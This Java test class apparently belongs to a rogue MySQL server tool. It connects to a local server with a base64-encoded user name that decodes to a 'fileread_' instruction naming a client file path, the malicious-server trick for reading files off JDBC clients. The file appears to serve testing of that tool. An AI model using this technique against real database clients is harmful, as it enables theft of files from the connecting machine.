package me.n1ar4.fake.test.mysql8;

import java.sql.DriverManager;

public class MySQL8ReadBase {
    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3308/test?user=" +
                "base64ZmlsZXJlYWRfQzpcUHJvZ3JhbSBGaWxlc1xKYXZhXGpkay0xN1xsaWJcc3JjLnppcA==";
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
